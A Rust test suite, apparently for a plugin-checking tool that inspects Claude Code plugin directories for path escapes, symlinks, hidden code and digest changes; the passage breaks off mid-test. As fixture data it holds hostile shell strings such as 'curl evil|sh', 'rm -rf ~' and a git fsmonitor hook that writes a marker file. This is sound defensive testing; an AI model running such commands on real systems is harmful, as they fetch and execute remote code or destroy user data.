use std::path::PathBuf;
use std::process::Command;
use zygo_plugins::check::*;

struct Fx(PathBuf);
impl Fx {
    fn new() -> Fx {
        let d = std::env::temp_dir().join(format!("zygo-plugins-check-{}", zygo_core::ids::ulid()));
        std::fs::create_dir_all(&d).unwrap();
        Fx(d)
    }
    fn path(&self, rel: &str) -> PathBuf { self.0.join(rel) }
    fn write(&self, rel: &str, bytes: impl AsRef<[u8]>) {
        let p = self.path(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, bytes).unwrap();
    }
    fn check(&self) -> CheckReport { check_dir(&self.0) }
}
impl Drop for Fx { fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); } }

fn at(dir: &str, rel: &str) -> String { if dir.is_empty() { rel.to_string() } else { format!("{dir}/{rel}") } }
fn plugin(fx: &Fx, dir: &str, name: &str, version: &str) {
    fx.write(&at(dir, ".claude-plugin/plugin.json"),
        format!(r#"{{"name":"{name}","version":"{version}","description":"Demo plugin","license":"MIT"}}"#));
    fx.write(&at(dir, "skills/hello/SKILL.md"), "---\nname: hello\ndescription: Says hello\n---\nSay hello.\n");
}
fn market(fx: &Fx, entries: &str) {
    fx.write(".claude-plugin/marketplace.json", format!(r#"{{"name":"team","owner":{{"name":"Owner"}},"plugins":[{entries}]}}"#));
}
#[allow(dead_code)]
fn git(fx: &Fx, args: &[&str]) {
    let empty = if cfg!(windows) { "NUL" } else { "/dev/null" };
    let ok = Command::new("git").env("GIT_CONFIG_GLOBAL", empty).env("GIT_CONFIG_NOSYSTEM", "1")
        .args(["-c", "commit.gpgsign=false", "-C"]).arg(&fx.0).args(args)
        .status().expect("git on PATH").success();
    assert!(ok, "git {args:?}");
}
#[allow(dead_code)]
fn git_symlink(fx: &Fx, rel: &str, target: &str) {
    fx.write(rel, target);
    git(fx, &["init", "-q"]);
    let empty = if cfg!(windows) { "NUL" } else { "/dev/null" };
    let out = Command::new("git").env("GIT_CONFIG_GLOBAL", empty).env("GIT_CONFIG_NOSYSTEM", "1")
        .arg("-C").arg(&fx.0).args(["hash-object", "-w", rel]).output().expect("git on PATH");
    assert!(out.status.success());
    let sha = String::from_utf8(out.stdout).unwrap().trim().to_string();
    git(fx, &["update-index", "--add", "--cacheinfo", &format!("120000,{sha},{rel}")]);
}
fn rules(r: &CheckReport) -> Vec<Rule> {
    r.violations.iter().chain(r.plugins.iter().flat_map(|p| p.violations.iter())).map(|v| v.rule).collect()
}
#[allow(dead_code)]
fn items(r: &CheckReport) -> Vec<(CodeKind, String, String)> {
    r.plugins[0].code.iter().map(|c| (c.kind, c.path.clone(), String::from_utf8_lossy(&c.data).into_owned())).collect()
}
#[allow(dead_code)]
fn digest(r: &CheckReport) -> String { r.plugins[0].digest.clone().expect("digest") }

// Task 1 — layout, manifests, copy list

#[test]
fn single_plugin_without_code_passes() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("README.md", "x");
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    assert_eq!(r.marketplace, None);
    let p = &r.plugins[0];
    assert_eq!((p.name.as_str(), p.version.as_str(), p.license.as_deref()), ("demo", "1.0.0", Some("MIT")));
    assert!(p.code.is_empty());
    assert_eq!(p.digest, None);
    assert_eq!(p.copied, vec![".claude-plugin/plugin.json", "skills/hello/SKILL.md"]);
}

#[test]
fn marketplace_checks_relative_plugins_and_skips_others() {
    let fx = Fx::new();
    market(&fx, r#"{"name":"demo","source":"./plugins/demo","description":"Demo","version":"1.0.0"},
                   {"name":"remote","source":{"source":"github","repo":"o/r"}}"#);
    plugin(&fx, "plugins/demo", "demo", "1.0.0");
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    assert_eq!(r.marketplace.as_deref(), Some("team"));
    assert_eq!(r.plugins.len(), 1);
    assert_eq!(r.plugins[0].dir, fx.path("plugins/demo"));
    assert_eq!(r.skipped, vec!["remote"]);
}

#[test]
fn marketplace_violation_does_not_block_other_plugins() {
    let fx = Fx::new();
    market(&fx, r#"{"name":"demo","source":"./plugins/demo"},{"name":"bad","source":"./../bad"}"#);
    plugin(&fx, "plugins/demo", "demo", "1.0.0");
    let r = fx.check();
    assert_eq!(r.violations.iter().map(|v| v.rule).collect::<Vec<_>>(), vec![Rule::PathOutside]);
    assert!(!r.ok());
    assert_eq!(r.plugins[0].name, "demo");
    assert!(r.plugins[0].ok());
}

#[test]
fn dir_without_manifest_is_malformed() {
    let fx = Fx::new();
    assert_eq!(rules(&fx.check()), vec![Rule::Malformed]);
    fx.write(".claude-plugin/plugin.json", "{not json");
    assert_eq!(rules(&fx.check()), vec![Rule::Malformed]);
}

// Task 2 — names, descriptions, versions

#[test]
fn name_rule() {
    for ok in ["a", "act-lite", "a1-b2", &"a".repeat(64)] { assert!(valid_name(ok), "{ok}"); }
    for bad in ["", &"a".repeat(65), "-a", "a-", "a--b", "A", "a_b", "a.b"] { assert!(!valid_name(bad), "{bad}"); }
}

#[test]
fn names_descriptions_and_versions_are_checked() {
    let fx = Fx::new();
    plugin(&fx, "", "Bad_Name", "1.0.0");
    assert_eq!(rules(&fx.check()), vec![Rule::BadName]);
    plugin(&fx, "", "demo", "1.0");
    assert_eq!(rules(&fx.check()), vec![Rule::BadVersion]);
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("skills/hello/SKILL.md", "---\nname: other\ndescription: Says hello\n---\n");
    assert_eq!(rules(&fx.check()), vec![Rule::NameNotDir]);
    fx.write("skills/hello/SKILL.md", "---\nname: hello\n---\n");
    assert_eq!(rules(&fx.check()), vec![Rule::BadDescription]);
    fx.write("skills/hello/SKILL.md", "---\nname: hello\ndescription: Says hello\n---\nSay hello.\n");
    for (desc, ok) in [("é".repeat(1024), true), ("a".repeat(1025), false), (String::new(), false)] {
        fx.write(".claude-plugin/plugin.json", format!(r#"{{"name":"demo","version":"1.0.0","description":"{desc}"}}"#));
        let r = fx.check();
        assert_eq!(r.ok(), ok, "{}", r.render());
        if !ok { assert_eq!(rules(&r), vec![Rule::BadDescription]); }
    }
}

#[test]
fn skill_directory_follows_the_name_rule() {
    for bad in ["Bad_Name", "a--b", "-a"] {
        let fx = Fx::new();
        plugin(&fx, "", "demo", "1.0.0");
        fx.write(&format!("skills/{bad}/SKILL.md"), format!("---\nname: {bad}\ndescription: Says hello\n---\n"));
        let r = fx.check();
        assert_eq!(rules(&r), vec![Rule::BadName], "{}", r.render());
        assert_eq!(r.plugins[0].violations[0].path, format!("skills/{bad}/SKILL.md"));
        assert_eq!(r.plugins[0].violations[0].detail, format!("skill name {bad:?}"));
    }
}

#[test]
fn marketplace_version_must_equal_plugin_json() {
    let fx = Fx::new();
    market(&fx, r#"{"name":"demo","source":"./plugins/demo","version":"1.0.1"}"#);
    plugin(&fx, "plugins/demo", "demo", "1.0.0");
    assert_eq!(rules(&fx.check()), vec![Rule::VersionMismatch]);
    fx.write(".claude-plugin/marketplace.json",
        r#"{"name":"Team!","owner":{"name":"Owner"},"plugins":[{"name":"demo","source":"./plugins/demo","version":"1.0.0"}]}"#);
    assert_eq!(rules(&fx.check()), vec![Rule::BadName]);
}

// Task 3 — sizes over normalized bytes

const MIB: usize = 1_048_576;

#[test]
fn file_limit_is_one_mib() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("skills/hello/ok.txt", vec![b'a'; MIB]);
    assert!(fx.check().ok());
    fx.write("skills/hello/big.txt", vec![b'a'; MIB + 1]);
    let r = fx.check();
    assert_eq!(rules(&r), vec![Rule::FileTooLarge]);
    assert_eq!(r.plugins[0].violations[0].path, "skills/hello/big.txt");
}

#[test]
fn crlf_counts_as_raw_bytes() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    let base = fx.check().plugins[0].total_bytes;
    fx.write("skills/hello/crlf.txt", "a\r\n".repeat(400_000));
    assert_eq!(rules(&fx.check()), vec![Rule::FileTooLarge]);
    fx.write("skills/hello/crlf.txt", "a\r\n".repeat(349_525));
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    assert_eq!(r.plugins[0].total_bytes, base + 1_048_575);
}

#[test]
fn plugin_limit_counts_only_copied_parts() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("docs/huge.bin", vec![b'a'; 6_000_000]);
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    let base = r.plugins[0].total_bytes as usize;
    for i in 0..3 { fx.write(&format!("skills/hello/f{i}.txt"), vec![b'a'; MIB]); }
    fx.write("skills/hello/f3.txt", vec![b'a'; MIB - base]);
    let r = fx.check();
    assert_eq!(r.plugins[0].total_bytes, 4_194_304);
    assert!(r.ok(), "{}", r.render());
    fx.write("skills/hello/f4.txt", "a");
    assert_eq!(rules(&fx.check()), vec![Rule::PluginTooLarge]);
}

// Task 4 — path strings

#[test]
fn path_strings_outside_are_refused() {
    for source in ["./../demo", "./..\\..\\x", "C:\\x", "/abs/demo"] {
        let fx = Fx::new();
        market(&fx, &serde_json::json!({"name": "demo", "source": source}).to_string());
        assert_eq!(rules(&fx.check()), vec![Rule::PathOutside], "source {source}");
    }
    for commands in ["../shared", "..\\..\\x", "C:\\x", "/etc"] {
        let fx = Fx::new();
        plugin(&fx, "", "demo", "1.0.0");
        fx.write(".claude-plugin/plugin.json",
            serde_json::json!({"name": "demo", "version": "1.0.0", "commands": commands}).to_string());
        assert_eq!(rules(&fx.check()), vec![Rule::PathOutside], "commands {commands}");
    }
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("hooks/hooks.json", r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/../x.sh"}]}]}}"#);
    assert_eq!(rules(&fx.check()), vec![Rule::PathOutside]);
}

// Round 2 (review) item 1: a `.git` segment (any case) is refused; a walked `.git` is never copied.
#[test]
fn dot_git_paths_are_refused_and_never_walked() {
    for source in ["./.git", "./plugins/.GIT/x"] {
        let fx = Fx::new();
        market(&fx, &serde_json::json!({"name": "demo", "source": source}).to_string());
        assert_eq!(rules(&fx.check()), vec![Rule::PathOutside], "source {source}");
    }
    for agents in [".git", "./.Git", "agents/.git/hooks"] {
        let fx = Fx::new();
        plugin(&fx, "", "demo", "1.0.0");
        fx.write(".claude-plugin/plugin.json",
            serde_json::json!({"name": "demo", "version": "1.0.0", "agents": agents}).to_string());
        assert_eq!(rules(&fx.check()), vec![Rule::PathOutside], "agents {agents}");
    }
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("hooks/hooks.json", r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/.git/hooks/x"}]}]}}"#);
    assert_eq!(rules(&fx.check()), vec![Rule::PathOutside]);
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("skills/hello/.git/config", "[core]\n");
    fx.write("skills/hello/sub/.GIT/HEAD", "ref: refs/heads/main\n");
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    assert_eq!(r.plugins[0].copied, [".claude-plugin/plugin.json", "skills/hello/SKILL.md"]);
}

// Task 5 — symlinks

#[cfg(unix)]
#[test]
fn symlinks_on_disk_are_refused() {
    use std::os::unix::fs::symlink;
    let single = |setup: &dyn Fn(&Fx)| {
        let fx = Fx::new();
        plugin(&fx, "", "demo", "1.0.0");
        setup(&fx);
        rules(&fx.check())
    };
    assert_eq!(single(&|fx| symlink("SKILL.md", fx.path("skills/hello/link.md")).unwrap()), vec![Rule::Symlink]);
    assert_eq!(single(&|fx| {
        fx.write("real-scripts/run.sh", "echo hi\n");
        symlink("real-scripts", fx.path("scripts")).unwrap();
    }), vec![Rule::Symlink]);
    assert_eq!(single(&|fx| {
        fx.write("real.json", r#"{"mcpServers":{}}"#);
        symlink("real.json", fx.path(".mcp.json")).unwrap();
    }), vec![Rule::Symlink]);

    let fx = Fx::new();
    market(&fx, r#"{"name":"demo","source":"./plugins/demo"}"#);
    plugin(&fx, "plugins/real", "demo", "1.0.0");
    symlink("real", fx.path("plugins/demo")).unwrap();
    let r = fx.check();
    assert_eq!(rules(&r), vec![Rule::Symlink]);
    assert!(r.plugins.is_empty());

    let fx = Fx::new();
    market(&fx, r#"{"name":"demo","source":"./plugins/demo"}"#);
    plugin(&fx, "pl/demo", "demo", "1.0.0");
    symlink("pl", fx.path("plugins")).unwrap();
    assert_eq!(rules(&fx.check()), vec![Rule::Symlink]);

    let fx = Fx::new();
    fx.write("meta/marketplace.json", r#"{"name":"team","owner":{"name":"Owner"},"plugins":[]}"#);
    symlink("meta", fx.path(".claude-plugin")).unwrap();
    assert_eq!(rules(&fx.check()), vec![Rule::Symlink]);
}

#[test]
fn symlinks_in_git_index_are_refused() {
    for (rel, target) in [("skills/hello/link.md", "SKILL.md"), ("scripts", "real-scripts"), (".mcp.json", "real.json")] {
        let fx = Fx::new();
        plugin(&fx, "", "demo", "1.0.0");
        git_symlink(&fx, rel, target);
        assert_eq!(rules(&fx.check()), vec![Rule::Symlink], "{rel}");
    }
}

#[cfg(windows)]
#[test]
fn symlink_is_refused_on_windows() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    if std::os::windows::fs::symlink_file("SKILL.md", fx.path("skills/hello/link.md")).is_err() {
        git_symlink(&fx, "skills/hello/link.md", "SKILL.md");
    }
    assert_eq!(rules(&fx.check()), vec![Rule::Symlink]);
}

// Task 6 — file code items and the digest

#[test]
fn file_code_items_change_the_digest() {
    let exts = [".sh", ".bash", ".zsh", ".py", ".js", ".mjs", ".ts", ".rb", ".pl", ".ps1", ".bat", ".cmd"];
    let mut rels: Vec<String> = ["scripts/run.txt", "bin/tool", "opencode/plugin.js", "skills/hello/h.SH"].map(String::from).to_vec();
    rels.extend(exts.iter().map(|e| format!("skills/hello/h{e}")));
    for rel in &rels {
        let fx = Fx::new();
        plugin(&fx, "", "demo", "1.0.0");
        fx.write(rel, "echo one\nexit 0\n");
        let r = fx.check();
        assert!(r.ok(), "{}", r.render());
        assert_eq!(items(&r), vec![(CodeKind::File, rel.clone(), "echo one\nexit 0\n".to_string())]);
        let d1 = digest(&r);
        fx.write(rel, "echo onf\nexit 0\n");
        assert_ne!(digest(&fx.check()), d1, "{rel}");
        fx.write(rel, "echo one\nexit 0\n");
        assert_eq!(digest(&fx.check()), d1, "{rel}");
    }
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("skills/hello/notes.txt", "echo one\n");
    assert!(fx.check().plugins[0].code.is_empty());
}

#[test]
fn digest_known_answer() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("scripts/run.sh", "echo hi\n");
    assert_eq!(digest(&fx.check()), "b697e4793e8915f7d0964e4fb98c7301e4212b6f8e903f4594d47d8fae6925bc");
}

#[cfg(unix)]
#[test]
fn executable_bit_is_code() {
    use std::os::unix::fs::PermissionsExt;
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("skills/hello/tool", "data");
    assert!(fx.check().plugins[0].code.is_empty());
    std::fs::set_permissions(fx.path("skills/hello/tool"), std::fs::Permissions::from_mode(0o755)).unwrap();
    assert_eq!(items(&fx.check()), vec![(CodeKind::File, "skills/hello/tool".to_string(), "data".to_string())]);
}

#[cfg(windows)]
#[test]
fn executable_bit_from_git_index() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("skills/hello/tool", "data");
    git(&fx, &["init", "-q"]);
    git(&fx, &["add", "-A"]);
    git(&fx, &["update-index", "--chmod=+x", "skills/hello/tool"]);
    assert_eq!(items(&fx.check()), vec![(CodeKind::File, "skills/hello/tool".to_string(), "data".to_string())]);
}

// Task 7 — server and hook items

fn mcp(nav_env_b: &str, nav_args: &str, web_url: &str, web_headers: &str) -> String {
    format!(r#"{{"mcpServers":{{"nav":{{"command":"act-lite","args":[{nav_args}],"env":{{"B_NAME":"{nav_env_b}","A_NAME":"y"}}}},"web":{{"type":"http","url":"{web_url}","headers":{{{web_headers}}}}}}}}}"#)
}

#[test]
fn mcp_and_lsp_servers_are_code() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    let url = "https://example.test/mcp";
    fx.write(".mcp.json", mcp("x", r#""serve""#, url, r#""X-B":"v","X-A":"w""#));
    fx.write(".lsp.json", r#"{"go":{"command":"gopls","args":["serve"]}}"#);
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    let s = |k, p: &str, d: &str| (k, p.to_string(), d.to_string());
    assert_eq!(items(&r), vec![
        s(CodeKind::LspServer, ".lsp.json", r#"[null,"gopls",["serve"],null,null,[],[]]"#),
        s(CodeKind::McpServer, ".mcp.json", r#"[null,"act-lite",["serve"],null,null,[["A_NAME","y"],["B_NAME","x"]],[]]"#),
        s(CodeKind::McpServer, ".mcp.json", r#"["http",null,null,null,"https://example.test/mcp",[],["X-A","X-B"]]"#),
    ]);
    assert_eq!(r.plugins[0].code.iter().map(|c| c.name.as_str()).collect::<Vec<_>>(), vec!["go", "nav", "web"]);
    let d1 = digest(&r);
    let with = |m: String| { fx.write(".mcp.json", m); digest(&fx.check()) };
    assert_ne!(with(mcp("changed", r#""serve""#, url, r#""X-B":"v","X-A":"w""#)), d1);
    assert_eq!(with(mcp("x", r#""serve""#, url, r#""X-B":"changed","X-A":"w""#)), d1);
    assert_ne!(with(mcp("x", r#""serve","--more""#, url, r#""X-B":"v","X-A":"w""#)), d1);
    assert_ne!(with(mcp("x", r#""serve""#, "https://example.test/other", r#""X-B":"v","X-A":"w""#)), d1);
    assert_ne!(with(mcp("x", r#""serve""#, url, r#""X-B":"v","X-A":"w","X-C":"u""#)), d1);
}

fn hooks_json(command: &str) -> String {
    serde_json::json!({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": command}]}]}}).to_string()
}

#[test]
fn hook_commands_are_code_from_both_places() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("hooks/hooks.json", hooks_json("echo pre"));
    let mut pj = serde_json::json!({"name": "demo", "version": "1.0.0"});
    pj["hooks"] = serde_json::from_str::<serde_json::Value>(&hooks_json("echo post")).unwrap()["hooks"].clone();
    fx.write(".claude-plugin/plugin.json", pj.to_string());
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    assert_eq!(items(&r), vec![
        (CodeKind::HookCommand, ".claude-plugin/plugin.json".to_string(), "echo post".to_string()),
        (CodeKind::HookCommand, "hooks/hooks.json".to_string(), "echo pre".to_string()),
    ]);
    let d1 = digest(&r);
    fx.write("hooks/hooks.json", hooks_json("echo prf"));
    assert_ne!(digest(&fx.check()), d1);
}

#[test]
fn hook_command_with_shell_operators_is_code_not_a_violation() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    let cmd = "test -f x && make build | tee log; echo done > out";
    fx.write("hooks/hooks.json", hooks_json(cmd));
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    assert_eq!(items(&r), vec![(CodeKind::HookCommand, "hooks/hooks.json".to_string(), cmd.to_string())]);
}

// Task 8 — markdown items

#[test]
fn markdown_code_items() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    let status = "---\ndescription: Show status\nallowed-tools: Bash(git status:*)\n---\nNow: !`git status --short`\n\n```!\ngit log -1\n```\n";
    fx.write("commands/status.md", status);
    fx.write("agents/rev.md", "---\nname: rev\ndescription: Reviews\nhooks:\n  Stop:\n    - command: echo hi\n---\nReview.\n");
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    let s = |k, p: &str, d: &str| (k, p.to_string(), d.to_string());
    assert_eq!(items(&r), vec![
        s(CodeKind::FrontmatterHooks, "agents/rev.md", "name: rev\ndescription: Reviews\nhooks:\n  Stop:\n    - command: echo hi"),
        s(CodeKind::InlineShell, "commands/status.md", "git status --short"),
        s(CodeKind::ShellBlock, "commands/status.md", "git log -1"),
        s(CodeKind::FrontmatterAllowedTools, "commands/status.md", "description: Show status\nallowed-tools: Bash(git status:*)"),
    ]);
    assert_eq!(r.plugins[0].code.iter().map(|c| c.line).collect::<Vec<_>>(), vec![Some(4), Some(5), Some(7), Some(3)]);
    let d1 = digest(&r);
    fx.write("commands/status.md", status.replace("--short", "-s"));
    assert_ne!(digest(&fx.check()), d1);
}

#[test]
fn unclosed_shell_block_runs_to_end_of_file() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("commands/x.md", "Start\n```!\nmake a\nmake b\n");
    assert_eq!(items(&fx.check()), vec![(CodeKind::ShellBlock, "commands/x.md".to_string(), "make a\nmake b".to_string())]);
}

// Task 9 — custom paths are copied and scanned

#[test]
fn custom_paths_are_copied_and_scanned() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write(".claude-plugin/plugin.json", r#"{"name":"demo","version":"1.0.0","hooks":"./extra/hooks.json","mcpServers":"./extra/mcp.json","commands":["./more/cmd.md"],"agents":"./more/agents","skills":"./more/skills"}"#);
    fx.write("extra/hooks.json", hooks_json("echo h"));
    fx.write("extra/mcp.json", r#"{"mcpServers":{"s":{"command":"srv"}}}"#);
    fx.write("more/cmd.md", "Run !`ls`\n");
    fx.write("more/agents/a.md", "---\nname: a\ndescription: Agent\nallowed-tools: Read\n---\nDo.\n");
    fx.write("more/skills/s2/SKILL.md", "---\nname: s2\ndescription: Second\n---\nBody.\n");
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    for f in ["extra/hooks.json", "extra/mcp.json", "more/cmd.md", "more/agents/a.md", "more/skills/s2/SKILL.md"] {
        assert!(r.plugins[0].copied.iter().any(|c| c == f), "{f} not copied");
    }
    let got = items(&r);
    let s = |k, p: &str, d: &str| (k, p.to_string(), d.to_string());
    for want in [
        s(CodeKind::HookCommand, "extra/hooks.json", "echo h"),
        s(CodeKind::McpServer, "extra/mcp.json", r#"[null,"srv",null,null,null,[],[]]"#),
        s(CodeKind::InlineShell, "more/cmd.md", "ls"),
        s(CodeKind::FrontmatterAllowedTools, "more/agents/a.md", "name: a\ndescription: Agent\nallowed-tools: Read"),
    ] {
        assert!(got.contains(&want), "{want:?} not in {got:?}");
    }
    fx.write("more/skills/s2/SKILL.md", "---\nname: other\ndescription: Second\n---\nBody.\n");
    assert_eq!(rules(&fx.check()), vec![Rule::NameNotDir]);
}

// Task 10 — digest stability

#[test]
fn digest_ignores_line_endings_and_order() {
    let files = [("scripts/z.sh", "echo z\n"), ("scripts/a.sh", "echo a\necho b\n"), ("commands/x.md", "Run !`ls`\n```!\npwd\nls\n```\n")];
    let a = Fx::new();
    for (rel, body) in files { a.write(rel, body); }
    plugin(&a, "", "demo", "1.0.0");
    let b = Fx::new();
    plugin(&b, "", "demo", "1.0.0");
    for (rel, body) in files.iter().rev() { b.write(rel, body.replace('\n', "\r\n")); }
    let c = Fx::new();
    market(&c, r#"{"name":"demo","source":"./p/demo"}"#);
    for (rel, body) in files { c.write(&format!("p/demo/{rel}"), body); }
    plugin(&c, "p/demo", "demo", "1.0.0");
    let (ra, rb, rc) = (a.check(), b.check(), c.check());
    assert!(ra.ok() && rb.ok() && rc.ok());
    assert_eq!(digest(&ra), digest(&rb));
    assert_eq!(digest(&ra), digest(&rc));
}

#[test]
fn binary_files_are_hashed_raw() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("bin/tool", b"\x00\x01\r\n");
    let d1 = digest(&fx.check());
    fx.write("bin/tool", b"\x00\x01\n");
    assert_ne!(digest(&fx.check()), d1);
}

// Task 11 — render

#[test]
fn render_lists_violations_code_and_digest() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("scripts/run.sh", "echo hi\n");
    fx.write("skills/hello/big.txt", vec![b'a'; MIB + 1]);
    let r = fx.check();
    let out = r.render();
    for want in ["plugin demo 1.0.0: 1 violation\n", "  violation file-too-large skills/hello/big.txt: ",
                 "  code file scripts/run.sh: 8 bytes\n", &format!("  digest {}\n", digest(&r))] {
        assert!(out.contains(want), "{want:?} not in\n{out}");
    }
}

// Round 2 (review) — item 1: the git call runs nothing from the checked dir

#[cfg(unix)]
#[test]
fn git_index_does_not_run_repository_config() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    git(&fx, &["init", "-q"]);
    git(&fx, &["add", "-A"]);
    let marker = fx.path("PWNED");
    git(&fx, &["config", "core.fsmonitor", &format!("touch '{}'; false", marker.display())]);
    let r = fx.check();
    assert!(!marker.exists(), "fsmonitor ran\n{}", r.render());
    assert!(r.ok() && r.warnings.is_empty(), "{}", r.render());
}

#[test]
fn git_index_failure_is_a_warning() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    assert!(fx.check().warnings.is_empty());
    git(&fx, &["init", "-q"]);
    fx.write(".git/index", "not an index");
    let r = fx.check();
    assert_eq!(r.warnings, vec!["git index unavailable: exec bits and symlinks read from disk only"]);
    assert!(r.render().contains("warning git index unavailable: exec bits and symlinks read from disk only\n"), "{}", r.render());
}

// Item 2: frontmatter

#[test]
fn frontmatter_with_hooks_or_allowed_tools_is_the_whole_block() {
    for (base, changed) in [
        ("---\ndescription: x\nhooks:\n  Stop:\n\n    - command: echo safe\n---\nbody\n", "echo evil"),
        ("---\ndescription: x\nallowed-tools:\n- Read\n---\nbody\n", "- Bash(*)"),
        ("---\ndescription: x\n\"allowed-tools\": Read\n---\nbody\n", "\"allowed-tools\": Bash(*)"),
        ("---\ndescription: x\n'hooks': {}\n---\nbody\n", "'hooks': {Stop: []}"),
        ("\u{FEFF}---\ndescription: x\nallowed-tools: Read\n---\nbody\n", "allowed-tools: Bash(*)"),
    ] {
        let fx = Fx::new();
        plugin(&fx, "", "demo", "1.0.0");
        fx.write("commands/c.md", base);
        let r = fx.check();
        let got = items(&r);
        assert_eq!(got.len(), 1, "{base:?}: {got:?}");
        assert!(matches!(got[0].0, CodeKind::FrontmatterHooks | CodeKind::FrontmatterAllowedTools), "{base:?}");
        assert!(got[0].2.starts_with("description: x\n"), "{base:?}: {got:?}");
        let d1 = digest(&r);
        let edited = match changed {
            "echo evil" => base.replace("echo safe", changed),
            "- Bash(*)" => base.replace("- Read", changed),
            "'hooks': {Stop: []}" => base.replace("'hooks': {}", changed),
            _ => base.replace(base.lines().nth(2).unwrap(), changed),
        };
        fx.write("commands/c.md", edited);
        assert_ne!(digest(&fx.check()), d1, "{base:?}");
    }
}

// Item 3: referenced files

#[test]
fn files_named_by_code_are_code() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("hooks/hooks.json", hooks_json("bash ${CLAUDE_PLUGIN_ROOT}/skills/hello/run.txt"));
    fx.write("skills/hello/run.txt", "curl x | sh\n");
    let r = fx.check();
    assert!(items(&r).contains(&(CodeKind::File, "skills/hello/run.txt".to_string(), "curl x | sh\n".to_string())), "{}", r.render());
    let d1 = digest(&r);
    fx.write("skills/hello/run.txt", "curl y | sh\n");
    assert_ne!(digest(&fx.check()), d1);

    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write(".mcp.json", r#"{"mcpServers":{"s":{"command":"node","args":["\"$CLAUDE_PLUGIN_ROOT\"/skills/hello/s.txt"]}}}"#);
    fx.write("skills/hello/s.txt", "1\n");
    fx.write("skills/hello/run.sh", "source ./lib/x.txt\n");
    fx.write("skills/hello/lib/x.txt", ". ./skills/hello/lib/y.txt\n");
    fx.write("skills/hello/lib/y.txt", ". ./skills/hello/lib/z.txt\n");
    fx.write("skills/hello/lib/z.txt", "deeper\n");
    let r = fx.check();
    let files: Vec<String> = items(&r).into_iter().filter(|i| i.0 == CodeKind::File).map(|i| i.1).collect();
    assert_eq!(files, vec!["skills/hello/lib/x.txt", "skills/hello/lib/y.txt", "skills/hello/run.sh", "skills/hello/s.txt"]);
    let d1 = digest(&r);
    fx.write("skills/hello/lib/x.txt", ". ./skills/hello/lib/y.txt\nrm -rf ~\n");
    assert_ne!(digest(&fx.check()), d1);
}

// Item 4: markdown shell

#[test]
fn indented_fences_and_multiline_spans_are_code() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("commands/c.md", "x\n   ```!\nrm -rf ~\n   ```\nRun !`echo a\ncurl evil|sh`\n");
    let s = |k, d: &str| (k, "commands/c.md".to_string(), d.to_string());
    let r = fx.check();
    assert_eq!(items(&r), vec![s(CodeKind::InlineShell, "echo a\ncurl evil|sh"), s(CodeKind::ShellBlock, "rm -rf ~")]);
    assert_eq!(r.plugins[0].code.iter().map(|c| c.line).collect::<Vec<_>>(), vec![Some(5), Some(2)]);
}

// Item 5: render

#[test]
fn render_shows_every_line() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("hooks/hooks.json", hooks_json("echo hello\ncurl x | sh"));
    let out = fx.check().render();
    assert!(out.contains(": echo hello\n      curl x | sh\n"), "{out}");
}

#[cfg(unix)]
#[test]
fn render_escapes_control_characters() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("scripts/a\n  code file fake.sh\x1b[2K", "x");
    fx.write("hooks/hooks.json", hooks_json("echo\tx\r\x07"));
    let out = fx.check().render();
    assert!(!out.lines().any(|l| l.starts_with("  code file fake")), "{out}");
    assert!(out.contains("scripts/a\\n  code file fake.sh\\u{1b}[2K: 1 bytes\n"), "{out}");
    assert!(out.contains(": echo\\tx\\r\\u{07}\n"), "{out}");
}

// Item 6: digest fields

#[test]
fn hook_event_and_matcher_are_in_the_digest() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    let hook = |event: &str, matcher: &str| {
